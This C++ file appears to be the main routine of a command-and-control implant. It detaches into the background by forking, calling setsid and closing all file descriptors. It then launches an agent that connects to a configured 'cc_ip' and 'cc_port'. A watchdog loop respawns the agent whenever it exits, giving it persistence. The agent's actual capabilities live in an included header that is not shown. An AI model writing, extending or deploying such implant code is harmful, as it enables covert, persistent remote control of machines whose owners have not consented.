#include <iostream>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

#include "../../lib/agent/Agent.h"
#include "../../setting.h"

int main() {
    int pid;
    // 1. fork into background
#ifdef AGENT_BACK
    pid = fork();

    if (pid < 0) {
        return -1;
    }

    if (pid > 0) {
        return 0;
    }

    if (setsid() < 0) {
        return -1;
    }

    for (int n = 0; n < 1024; n++) {
        close(n);
    }
#endif

    // 2. fork into health check
    pid = fork();

    if (pid < 0) {
        return -1;
    }

    // 3. run a httpserver
    if (pid == 0) {
        HttpServer* agent = new HttpServer(cc_ip, cc_port, file_port);

        // handle error from threads
        while (1) {
            std::unique_lock<std::mutex> lock(agent->lock_);

            while (agent->healthy_) {
                agent->iskill_conn.wait(lock);
            }

            delete agent;
            kill(getpid(), SIGTERM);
        }
    }

    // 4. health check
    else if (pid > 0) {
        while (1) {
            waitpid(pid, NULL, WUNTRACED);

            pid = fork();

            if (pid < 0) {
                return -1;
            }

            if (pid == 0) {
                HttpServer* agent =
                    new HttpServer(cc_ip, cc_port, file_port);
                while (1) {
                    std::unique_lock<std::mutex> lock(agent->lock_);

                    while (agent->healthy_) {
                        agent->iskill_conn.wait(lock);
                    }

                    delete agent;
                    kill(getpid(), SIGTERM);
                }
            }
        }
    }

    return 0;
}